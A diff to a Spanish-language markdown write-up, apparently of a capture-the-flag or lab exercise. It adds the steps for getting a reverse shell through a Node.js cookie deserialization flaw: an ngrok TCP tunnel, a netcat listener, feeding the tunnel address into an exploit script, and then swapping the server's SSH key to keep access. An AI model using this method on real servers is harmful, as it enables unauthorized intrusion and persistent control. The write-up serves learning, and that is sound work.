@@ -70,11 +70,32 @@ console.log('Serialized: ' + res);
 console.log('Cookie: ' + encodeURIComponent(Buffer.from(res).toString('base64')));
 ```
 
-Corriendo varios comandos con esta tecnica, vimos que el usuario activo es `root`, que hay keys autorizadas para conectarse por ssh. Osea podemos hacer de todo, hasta borrar archivos muajaja.
+Corriendo varios comandos con esta tecnica, vimos que el usuario activo es `root`, que hay keys autorizadas para conectarse por ssh. O sea que podemos hacer de todo, hasta borrar archivos muajaja.
 
-Intentamos hacer una conexion reversa con `netcat`, pero `netcat` no esta en el sistema. Entonces intentamos hacer una conexion reversa de ssh/generar keys para poder entrar, pero antes se nos ocurrio directamente conectarnos por nodejs.
+Así que intentamos hacer una conexion reversa con `netcat`, pero como `netcat` no estaba instalado en el sistema, buscamos otros métodos, como ssh/generar keys para poder entrar. Finalmente tuvimos la idea de directamente conectarnos por nodejs.
 
-Para esto hay que abrir puertos ...
+Para esto había que abrir puertos, pero abrir puertos desde la terminal es un bardo, porque hay que configurar el router. Entonces encontramos una herramienta llamada ngrok, que nos permite redirigir una conección tcp a traves de internet.
 
-# Parte de Octa
+Con [ngrok](https://ngrok.com/), podemos crear tuneles y forwardear cualquier tipo de conección (tcp, http, etc.) a un puerto que elijamos. Entonces, por ejemplo, corriendo `./ngrok tcp 4445` (donde ngrok es el ejecutable que nos descargamos desde la página), la terminal nos devuelve:
+
+```
+ngrok by @inconshreveable                                                                                  (Ctrl+C to quit)
+                                                                                                                           
+Session Status                online                                                                                       
+Account                       octaviopercivaldi2@gmail.com (Plan: Free)                                                    
+Version                       2.3.35                                                                                       
+Region                        United States (us)                                                                           
+Web Interface                 http://127.0.0.1:4040                                                                        
+Forwarding                    tcp://2.tcp.ngrok.io:16170 -> localhost:4445
+```
+
+Entonces, con esta información, podemos abrir otra terminal, y correr:
+
+```nc -nlvp 4445```
+
+Y con esto, vamos a estar escuchando todo lo que se envíe a la dirección `2.tcp.ngrok.io` y puerto `16170`.
+
+Finalmente, agregando la ip y el puerto que nos devuelve ngrok al script crack_sh.js, el cual nos genera la cookie, podemos enviarla, y el servidor se va a conectar a nuestra terminal (la cual corrimos el comando nc), y... * se pone la capucha * WE'RE IN!!!
+
+Ahora tenemos una terminal conectada al servidor, y por lo tanto tenemos permisos para crear, leer y eliminar archivos, entonces, podemos cambiar la clave ssh que esta en el servidor por una nueva la cual conozcamos su clave privada, y finalmente conectarnos en serio.
 
